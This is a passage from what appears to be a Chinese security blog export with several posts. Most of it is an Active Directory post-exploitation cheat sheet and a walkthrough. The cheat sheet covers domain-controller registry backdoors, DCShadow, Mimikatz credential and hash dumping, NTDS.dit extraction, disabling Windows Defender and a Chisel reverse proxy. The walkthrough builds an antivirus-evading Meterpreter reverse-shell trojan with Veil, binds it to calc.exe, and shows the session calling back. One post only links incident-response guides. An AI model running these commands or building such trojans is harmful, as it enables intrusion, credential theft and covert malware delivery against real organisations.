title="修改PowerShell远程访问的安全描述符"></a>修改PowerShell远程访问的安全描述符</h3><p>使用<code>Set-RemotePSRemoting.ps1</code>cmdlet向用户PowerShell远程访问计算机。可以运行以持久访问例如DC。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>RemotePSRemoting <span class="token operator">-</span>UserName student1 <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>有关执行，请参见上面的“使用PowerShell Remoting执行命令”。</p><h3 id="修改DC注册表安全描述符以使用DAMP进行远程哈希检索"><a href="#修改DC注册表安全描述符以使用DAMP进行远程哈希检索" class="headerlink" title="修改DC注册表安全描述符以使用DAMP进行远程哈希检索"></a>修改DC注册表安全描述符以使用DAMP进行远程哈希检索</h3><p>使用<a href="https://github.com/HarmJ0y/DAMP">DAMP工具</a>，我们就可以借壳DC注册表来给我们上的访问<code>SAM</code>，<code>SYSTEM</code>以及<code>SECURITY</code>注册表配置单元。这使我们能够远程转储DC机密（哈希）。</p><p>我们使用<code>Add-RemoteRegBackdoor.ps1</code>来自DAMP的cmdlet添加后门。</p><pre class="line-numbers language-powershell"><code class="language-powershell">Add<span class="token operator">-</span>RemoteRegBackdoor <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">-</span>Trustee Student355<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用<code>RemoteHashRetrieval.ps1</code>DAMP中的cmdlet远程转储秘密（以“受信任”用户身份运行）。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取针对银票攻击的机器帐户哈希</span>Get<span class="token operator">-</span>RemoteMachineAccountHash <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token comment" spellcheck="true"># 获取本地帐户哈希</span>Get<span class="token operator">-</span>RemoteLocalAccountHash <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token comment" spellcheck="true"># 获取缓存的凭据（如果有）</span>Get<span class="token operator">-</span>RemoteCachedCredential <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>DCShadow是一种通过临时模仿域控制器来掩盖某些动作的攻击。如果您在根域中具有Domain Admin或Enterprise Admin特权，则可以将其用于林级别的持久性。</p><p>（可选）作为域管理员，为选定的用户提供DCShadow攻击所需的特权（使用<code>Set-DCShadowPermissions.ps1</code>cmdlet）。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>DCShadowPermissions <span class="token operator">-</span>FakeDC mcorp<span class="token operator">-</span>student35 <span class="token operator">-</span>SamAccountName root355user <span class="token operator">-</span>Username student355 <span class="token operator">-</span>Verbose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后，在任何计算机上，使用Mimikatz进行DCShadow攻击。</p><pre class="line-numbers language-plaintext"><code class="language-plaintext"># 为用户设置SPNlsadump::dcshadow /object:root355user /attribute:servicePrincipalName /value:"SuperHacker/ServicePrincipalThingey"# 设置用户的SID历史记录（有效地授予他们企业管理员权限）lsadump::dcshadow /object:root355user /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519# 为用户设置AdminSDHolder容器上的完全控制权限## 需要检索当前的ACL：(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl## 然后获取目标用户的SID：Get-NetUser -UserName student355 | select objectsid## 最后，添加完全控制原语 (A;;CCDCLCSWRPWPLOCRRCWDWO;;;[SID]) for userlsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:O:DAG:DAD:PAI(A;;LCRPLORC;;;AU)[...currentACL...](A;;CCDCLCSWRPWPLOCRRCWDWO;;;S-1-5-21-1874506631-3219952063-538504511-45109)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，从DA会话或以前提供DCShadowPermissions的用户的会话中，运行DCShadow攻击。先前上演的动作将在不保留日志的情况下执行😈</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">lsadump::dcshadow /push<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post-Exploitation"></a>Post-Exploitation</h2><h3 id="LSASS保护"><a href="#LSASS保护" class="headerlink" title="LSASS保护"></a>LSASS保护</h3><p>有时，LSASS被配置为作为受保护进程（PPL）运行。您可以使用PowerShell进行查询，如下所示。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa <span class="token operator">-</span>Name <span class="token string">"RunAsPPL"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这种情况下，您不仅可以转储或解析LSASS，还需要使用禁用该保护<code>mimidrv.sys</code>。我不会在这里讨论如何做。</p><h3 id="Dumping-secrets-with-Mimikatz"><a href="#Dumping-secrets-with-Mimikatz" class="headerlink" title="Dumping secrets with Mimikatz"></a>Dumping secrets with Mimikatz</h3><pre class="line-numbers language-plaintext"><code class="language-plaintext"># 转储登录密码sekurlsa::logonpasswords# 从DC转储所有域散列## 注意：带有/patch的所有内容都很嘈杂，因为它_writes_到LSASS🚩lsadump::lsa /patch# 仅转储本地用户lsadump::sam# DCSync (requires 'ldap' SPN)lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Windows Credential Vault转储</p><blockquote><p>我在和一起使用时遇到了一些问题<code>Invoke-Mimikatz.ps1</code>。如果遇到问题，请尝试使用本机Mimikatz。</p></blockquote><pre><code># 转储Windows机密，例如计划任务的存储凭据（先提升权限）vault::listvault::cred /patch# 转储Windows机密DPAPI方法（噪音少，没有特定权限，需要）## 更多信息: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials## 首先，获取特定密钥的主密钥的GUIDdpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D## LSASS的EITHER Grab dpapi键sekurlsa::dpapi## 或抓取并缓存特定密钥dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b## Mimikatz将缓存主密钥（使用dpapi::cache检查）## Then run the initial dpapi::cred command again to get the juice!</code></pre><h3 id="没有Mimikatz的密码hash转储"><a href="#没有Mimikatz的密码hash转储" class="headerlink" title="没有Mimikatz的密码hash转储"></a>没有Mimikatz的密码hash转储</h3><p>我们也可以解析系统机密，而无需在目标系统上直接使用Mimikatz。</p><h4 id="Dumping-LSASS"><a href="#Dumping-LSASS" class="headerlink" title="Dumping LSASS"></a>Dumping LSASS</h4><p>运行Mimikatz的首选方法是使用目标中LSASS内存的转储副本在本地进行。<a href="https://github.com/outflanknl/Dumpert">Dumpert</a>，<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>或其他（自定义）工具可用于转储LSASS内存。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 通过进程快照（-r）转储LSASS内存，避免与之直接交互</span><span class="token punctuation">.</span>\procdump<span class="token punctuation">.</span>exe <span class="token operator">-</span>r <span class="token operator">-</span>ma lsass<span class="token punctuation">.</span>exe lsass<span class="token punctuation">.</span>dmp<span class="token comment" spellcheck="true"># 或者任务管理器找到lsass.exe进程右键创建转储文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在我们的攻击系统上下载内存转储文件后，我们可以运行Mimikatz并切换到“ Minidump”模式以如下方式解析文件。</p><pre class="line-numbers language-plaintext"><code class="language-plaintext">sekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Dumping-secrets-from-the-registry"><a href="#Dumping-secrets-from-the-registry" class="headerlink" title="Dumping secrets from the registry"></a>Dumping secrets from the registry</h4><p>我们可以从注册表中转储机密并“离线”解析文件，以获取系统机密列表。🚩</p><p>在目标上，我们运行以下命令：</p><pre class="line-numbers language-powershell"><code class="language-powershell">reg<span class="token punctuation">.</span>exe save hklm\sam c:\users\public\downloads\sam<span class="token punctuation">.</span>savereg<span class="token punctuation">.</span>exe save hklm\system c:\users\public\downloads\system<span class="token punctuation">.</span>savereg<span class="token punctuation">.</span>exe save hklm\security c:\users\public\downloads\security<span class="token punctuation">.</span>save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>然后，在我们的攻击盒子上，我们可以使用Impacket丢弃秘密：</p><pre class="line-numbers language-bash"><code class="language-bash">impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL <span class="token operator">></span> secrets.out<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h4><p>ntdsutil win2008开始DC中自带的工具</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#交互式</span>ntdsutilsnapshotactivate instance ntdscreate<span class="token function">mount</span> <span class="token namespace">[GUID]</span><span class="token comment" spellcheck="true"># copy 完之后再执行</span>unmout  <span class="token namespace">[GUID]</span><span class="token function">del</span> <span class="token namespace">[GUID]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 非交互式</span>ntdsutil snapshot <span class="token string">"activate instance ntds"</span> create quit quitntdsutil snapshot <span class="token string">"mount &amp;#123;GUID&amp;#125;"</span> quit quit<span class="token function">copy</span> MOUNT_POINT\windows\ntds\ntds<span class="token punctuation">.</span>dit c:\temp\ntds<span class="token punctuation">.</span>ditntdsutil snapshot <span class="token string">"unmount &amp;#123;GUID&amp;#125;"</span> <span class="token string">"delete &amp;#123;GUID&amp;#125;"</span> quit quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="QuarkPwDump分析-下载地址-https-github-com-quarkslab-quarkspwdump"><a href="#QuarkPwDump分析-下载地址-https-github-com-quarkslab-quarkspwdump" class="headerlink" title="QuarkPwDump分析 [下载地址][https://github.com/quarkslab/quarkspwdump]"></a>QuarkPwDump分析 [下载地址][<a href="https://github.com/quarkslab/quarkspwdump]">https://github.com/quarkslab/quarkspwdump]</a></h4><p>在线提取（直接在目标主机执行，实战中不选择此方式。）</p><pre class="line-numbers language-powershell"><code class="language-powershell">QuarkPwDump<span class="token punctuation">.</span>exe <span class="token operator">--</span>dump<span class="token operator">-</span>hash<span class="token operator">-</span>domain <span class="token operator">--</span>with<span class="token operator">-</span>history <span class="token operator">--</span>ntds<span class="token operator">-</span>file c:\ntds<span class="token punctuation">.</span>dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取</p><pre class="line-numbers language-powershell"><code class="language-powershell">QuarkPwDump<span class="token punctuation">.</span>exe <span class="token operator">--</span>dump<span class="token operator">-</span>hash<span class="token operator">-</span>domain <span class="token operator">--</span>with<span class="token operator">-</span>history <span class="token operator">--</span>ntds<span class="token operator">-</span>file c:\ntds<span class="token punctuation">.</span>dit <span class="token operator">--</span>system<span class="token operator">-</span>file c:\system<span class="token punctuation">.</span>hive >c:\hash<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ntdsutil-ifm-模块"><a href="#ntdsutil-ifm-模块" class="headerlink" title="ntdsutil: ifm 模块"></a>ntdsutil: ifm 模块</h4><p>WINDOWS SERVER 2008-2016</p><pre class="line-numbers language-powershell"><code class="language-powershell">C:\> ntdsutilntdsutil: activate instance ntdsntdsutil: ifmifm: create full c:\auditifm: quitntdsutil: quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用NtdsAudit.exe<a href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe">下载地址</a>解出ntds的hash</p><pre class="line-numbers language-powershell"><code class="language-powershell">NtdsAudit<span class="token punctuation">.</span>exe <span class="token string">"ntds.dit"</span> <span class="token operator">-</span>s <span class="token string">"SYSTEM"</span> <span class="token operator">-</span>p pwdump<span class="token punctuation">.</span>txt <span class="token operator">--</span>users<span class="token operator">-</span>csv users<span class="token punctuation">.</span>csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NtdsAudit需要<code>ntds.dit</code> Active Directory数据库，<code>SYSTEM</code> 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置<code>ntdsutil</code>实用程序。</p><ul><li>以管理员身份打开命令提示符（<code>cmd.exe</code>）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。</li></ul><pre class="line-numbers language-powershell"><code class="language-powershell">  <span class="token comment" spellcheck="true"># 在命令提示符下，键入以下命令，然后按ENTER键：</span>  ntdsutil    <span class="token comment" spellcheck="true"># 在ntdsutil提示符下，键入以下命令，然后按Enter：</span>  activate instance ntds    <span class="token comment" spellcheck="true"># 在ntdsutil提示符下，键入以下命令，然后按Enter：</span>  ifm    <span class="token comment" spellcheck="true"># 在ifm提示符下，键入以下命令，然后按Enter：</span>  create full &lt;Drive>:\&lt;Folder>    <span class="token comment" spellcheck="true"># &lt;Drive>:\&lt;Folder> 是要创建的文件的文件夹路径。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  例如，以下命令将显示统计信息，输出<code>pwdump.txt</code>包含密码哈希值的文件，并输出<code>users.csv</code>包含每个用户帐户详细信息的文件。</p><pre class="line-numbers language-powershell"><code class="language-powershell">ntdsaudit ntds<span class="token punctuation">.</span>dit <span class="token operator">-</span>s SYSTEM <span class="token operator">-</span>p pwdump<span class="token punctuation">.</span>txt <span class="token operator">-</span>u users<span class="token punctuation">.</span>csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Linux-明文密码的获取"><a href="#Linux-明文密码的获取" class="headerlink" title="Linux 明文密码的获取"></a>Linux 明文密码的获取</h4><p>mimipenguin</p><p>git clone <a href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p><p>支持的操作系统</p><table><thead><tr><th align="left">os</th><th align="left">service</th><th align="left">supported</th></tr></thead><tbody><tr><td align="left">Ubuntu Desktop 12.04 LTS x64</td><td align="left">gnome-keyring-daemon (3.18.3)</td><td align="left">Y</td></tr><tr><td align="left">Ubuntu Desktop 16.04 LTS x64</td><td align="left">gnome-keyring-daemon (3.18.3)</td><td align="left">Y</td></tr><tr><td align="left">Fedora Workstation 25 (x86_64)</td><td align="left">gnome-keyring-daemon (3.20.0)</td><td align="left">Y</td></tr><tr><td align="left">Fedora Workstation 27 (x86_64)</td><td align="left">gnome-keyring-daemon (3.20.1)</td><td align="left">Y</td></tr><tr><td align="left">Kali-rolling x64</td><td align="left">gnome-keyring-daemon (3.28.0.2)</td><td align="left">Y</td></tr></tbody></table><h4 id="从卷影副本中转储快照"><a href="#从卷影副本中转储快照" class="headerlink" title="从卷影副本中转储快照"></a>从卷影副本中转储快照</h4><p>我们还可以创建<code>SAM</code>和<code>SYSTEM</code>文件的“卷影副本” （它们始终锁定在当前系统上），因此我们仍然可以将它们复制到本地系统中。为此需要提升的提示</p><pre class="line-numbers language-powershell"><code class="language-powershell">wmic shadowcopy call create Volume=<span class="token string">'C:\'</span><span class="token function">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec<span class="token punctuation">.</span>corp1\Downloads\sam<span class="token function">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec<span class="token punctuation">.</span>corp1\Downloads\system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="关闭Windows-Defender"><a href="#关闭Windows-Defender" class="headerlink" title="关闭Windows Defender"></a>关闭Windows Defender</h3><p>👀🚩</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>MpPreference <span class="token operator">-</span>DisableRealtimeMonitoring <span class="token boolean">$true</span><span class="token function">Set</span><span class="token operator">-</span>MpPreference <span class="token operator">-</span>DisableIOAVProtection <span class="token boolean">$true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或将Defender保持启用状态，然后从其中删除签名。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token string">"C:\Program Files\Windows Defender\MpCmdRun.exe"</span> <span class="token operator">-</span>RemoveDefinitions <span class="token operator">-</span>All<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Chisel-代理"><a href="#Chisel-代理" class="headerlink" title="Chisel 代理"></a>Chisel 代理</h3><p>这是一个有关如何设置Socks代理以在受感染主机上进行凿凿的示例。凿子还可以做更多的事情！</p><p>在攻击者机器（Linux或Windows）上：</p><pre class="line-numbers language-bash"><code class="language-bash">./chisel server -p 8888 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>目标执行：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\chisel_windows_386<span class="token punctuation">.</span>exe client 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>16<span class="token punctuation">.</span>7:8888 R:8001:127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1:9001<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在，我们正在侦听<code>localhost:8001</code>攻击机，以将流量转发给<code>target:9001</code>。</p><p>然后，打开Socks服务器。估计的正好：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\chisel_windows_386<span class="token punctuation">.</span>exe server <span class="token operator">-</span>p 9001 <span class="token operator">--</span>socks5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在攻击机上：</p><pre class="line-numbers language-bash"><code class="language-bash">./chisel client localhost:8001 socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在，在攻击计算机的端口1080上打开了一个代理。</p><h3 id="Juicy-files"><a href="#Juicy-files" class="headerlink" title="Juicy files"></a>Juicy files</h3><p>有很多文件可能包含有趣的信息。<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a>类的工具或<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">PowerSploit</a>类的<a href="https://github.com/PowerShellMafia/PowerSploit">集合</a>可能有助于识别多汁的文件（用于privesc或post-exploitation）。</p><p>以下是我遇到过的一些相关文件的列表。根据计算机上安装的程序和/或服务检查文件。</p><blockquote><p>此外，不要忘记使用<code>sqlcmd</code>或枚举任何本地数据库<code>Invoke-SqlCmd</code>。</p></blockquote><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 所有用户文件夹</span><span class="token comment" spellcheck="true">## 如果文件太多，请限制此命令;）</span>tree <span class="token operator">/</span>f <span class="token operator">/</span>a C:\Users<span class="token comment" spellcheck="true"># Web.config</span>C:\inetpub\www\<span class="token operator">*</span>\web<span class="token punctuation">.</span>config<span class="token comment" spellcheck="true"># Unattend 文件</span>C:\Windows\Panther\Unattend<span class="token punctuation">.</span>xml<span class="token comment" spellcheck="true"># RDP 配置文件</span>C:\ProgramData\Configs\<span class="token comment" spellcheck="true"># Powershell scripts/config 文件</span>C:\Program Files\Windows PowerShell\<span class="token comment" spellcheck="true"># PuTTy 配置文件</span>C:\Users\<span class="token namespace">[USERNAME]</span>\AppData\LocalLow\Microsoft\Putty<span class="token comment" spellcheck="true"># FileZilla 证书</span>C:\Users\<span class="token namespace">[USERNAME]</span>\AppData\Roaming\FileZilla\FileZilla<span class="token punctuation">.</span>xml<span class="token comment" spellcheck="true"># Jenkins creds (also check out the Windows vault, see above)</span>C:\Program Files\Jenkins\credentials<span class="token punctuation">.</span>xml<span class="token comment" spellcheck="true"># WLAN profiles</span>C:\ProgramData\Microsoft\Wlansvc\Profiles\<span class="token operator">*</span><span class="token punctuation">.</span>xml<span class="token comment" spellcheck="true"># TightVNC 密码 (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)</span><span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path HKLM:\Software\TightVNC\Server <span class="token operator">-</span>Name <span class="token string">"Password"</span> <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty Password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 备忘录 </tag>
            
            <tag> AD </tag>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 内网命令收集</title>
      <link href="/2021/06/08/windows-nei-wang-ming-ling.htm"/>
      <url>/2021/06/08/windows-nei-wang-ming-ling.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-内网命令"><a href="#Windows-内网命令" class="headerlink" title="Windows 内网命令"></a>Windows 内网命令</h1><h2 id="常见信息收集命令"><a href="#常见信息收集命令" class="headerlink" title="常见信息收集命令"></a>常见信息收集命令</h2><span id="more"></span><pre><code>net user                                               本机用户列表    net localgroup administrators                          本机管理员[通常含有域用户]    net user /domain                                       查询域用户    net group /domain                                      查询域里面的工作组    net group &quot;domain admins&quot; /domain                      查询域管理员用户组    net localgroup administrators /domain                  登录本机的域管理员    net localgroup administrators workgroup\user001 /add   域用户添加到本机    net group &quot;Domain controllers&quot;                         查看域控制器(如果有多台)    ipconfig /all                                          查询本机IP段，所在域等    net view                                               查询同一域内机器列表    net view /domain                                       查询域列表    net view /domain:domainname                            查看workgroup域中计算机列表 </code></pre><h2 id="内网-域-渗透–基本命令"><a href="#内网-域-渗透–基本命令" class="headerlink" title="内网(域)渗透–基本命令"></a>内网(域)渗透–基本命令</h2><pre><code>ipconfig /all                                          查询本机IP段，所在域等 net user                                               本机用户列表 net localgroup administrators                          本机管理员[通常含有域用户] net user /domain                                       查询域用户 net group /domain                                      查询域里面的工作组 net group &quot;domain admins&quot; /domain                      查询域管理员用户组 net localgroup administrators /domain                  登录本机的域管理员 net localgroup administrators workgroup\user001 /add   域用户添加到本机 net group &quot;domain controllers&quot; /domain                 查看域控制器(如果有多台) net time /domain                                       判断主域，主域服务器都做时间服务器 net config workstation                                 当前登录域 net session                                            查看当前会话 net use \\ip\ipc$ pawword /user:username               建立IPC会话[空连接­***] net share                                              查看SMB指向的路径[即共享] net view                                               查询同一域内机器列表 net view \\ip                                          查询某IP共享 net view /domain                                       查询域列表 net view /domain:domainname                            查看workgroup域中计算机列表 net start                                              查看当前运行的服务 net accounts                                           查看本地密码策略 net accounts /domain                                   查看域密码策略nbtstat –A ip                                          netbios 查询  netstat –an/ano/anb                                    网络连接查询  route print                                            路由表 </code></pre><hr><center>End</center >]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows linux 应急响应流程及实战演练</title>
      <link href="/2021/06/08/windows-linux-ying-ji-xiang-ying.htm"/>
      <url>/2021/06/08/windows-linux-ying-ji-xiang-ying.htm</url>
      
        <content type="html"><![CDATA[<blockquote><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p></blockquote><span id="more"></span><p><a href="https://mp.weixin.qq.com/s/odo2Fjtklj-ibStAsyUjHw">windows 应急流程及实战演练</a></p><p><a href="https://mp.weixin.qq.com/s/mG0O8Pr8kFF195JLc-XD3A">Linux 应急响应流程及实战演练</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Veil-Evasion + pyJoiner 捆绑两个 EXE 的免杀木马</title>
      <link href="/2021/06/08/veil-pyjoiner.htm"/>
      <url>/2021/06/08/veil-pyjoiner.htm</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习 veil 的 Veil-Evasion 模块，发现一款能捆绑两个 exe 文件的 pyJoiner 工具，便拿来学习学习。</p><span id="more"></span><h2 id="0x01-在kali-linux-2018-1-安装使用-veil-3-1-1-制作回连木马"><a href="#0x01-在kali-linux-2018-1-安装使用-veil-3-1-1-制作回连木马" class="headerlink" title="0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马"></a>0x01 在kali linux 2018.1 安装使用 veil 3.1.1 制作回连木马</h2><ul><li><p>Veil-Evasion 制作回连木马</p><pre><code>root@kali:~# veiluse 1                        #选择使用 Veil-Evasion 模块Veil-Evasion Menu    41 payloads loadedAvailable Commands:    back            Go to main Veil menu    checkvt            Check virustotal against generated hashes    clean            Remove generated artifacts    exit            Exit Veil    info            Information on a specific payload    list            List available payloads    use            Use a specific payloadVeil-Evasion command: use 11        #选择payload[cs/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.3.149[cs/meterpreter/rev_tcp&gt;&gt;] set LPORT 4444[cs/meterpreter/rev_tcp&gt;&gt;] generate</code></pre><p><img src="/uploads/9.jpg" alt="veil"></p><p>使用以下命令开启监听：</p><p><code>root@kali:~# msfconsole  -r /var/lib/veil/output/handlers/test.rc</code></p></li></ul><h2 id="0x02-配置-pyJoiner—GUI-Version-运行环境"><a href="#0x02-配置-pyJoiner—GUI-Version-运行环境" class="headerlink" title="0x02 配置 pyJoiner—GUI-Version 运行环境"></a>0x02 配置 pyJoiner—GUI-Version 运行环境</h2><p>GitHub 上有两个版本 <a href="https://github.com/danielhnmoreno">项目地址</a>  ，其中 kali 版必须使用 Kali Linux i386 ，我的是 x64 kali ，所以选择了 Windows版本的 pyJoiner—GUI-Version。</p><p>本次实验 pyJoiner 运行环境如下：</p><ul><li>Windows 10 </li><li>Python 3.6.3 </li><li>pyinstaller 3.3.1</li></ul><h2 id="0x03-将两个exe文件进行捆绑"><a href="#0x03-将两个exe文件进行捆绑" class="headerlink" title="0x03 将两个exe文件进行捆绑"></a>0x03 将两个exe文件进行捆绑</h2><p>这里捆绑的是 calc.exe 这个程序，将回连木马 test.exe 与其进行捆绑，过程如下：</p><p><code>py -3 pyJoiner.py </code>         #在 pyJoiner 目录下运行 CMD 执行命令，切记不要关闭CMD</p><p>打开 GUI 如下图：</p><p><img src="/uploads/10.jpg" alt="GUI"></p><p>实验中 file1 选择的 calc.exe ，file2 选择的回连木马test.exe， 选择好之后点击 Join 。</p><p>捆绑后生成的 exe 路径如下：</p><p><img src="/uploads/12.jpg" alt="路径"></p><h2 id="0x04-免杀回连测试"><a href="#0x04-免杀回连测试" class="headerlink" title="0x04 免杀回连测试"></a>0x04 免杀回连测试</h2><p>使用在线查杀引擎 virustotal 的结果如下：</p><p><img src="/uploads/13.jpg" alt="virustotal"></p><p>回连测试：</p><ul><li>目标机 Windows 10</li><li>在目标机双击捆绑后的文件，打开了捆绑的 file1 应用程序计算器</li><li><img src="/uploads/14.jpg" alt="calc"></li><li>kali 回连 Meteoreter  session </li></ul><pre><code>msf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.3.138[*] Meterpreter session 1 opened (192.168.3.149:4444 -&gt; 192.168.3.138:38099) at 2018-03-06 07:22:08 -0500</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.youtube.com/watch?v=vHz8QU2Dj9M">https://www.youtube.com/watch?v=vHz8QU2Dj9M</a></p><p><a 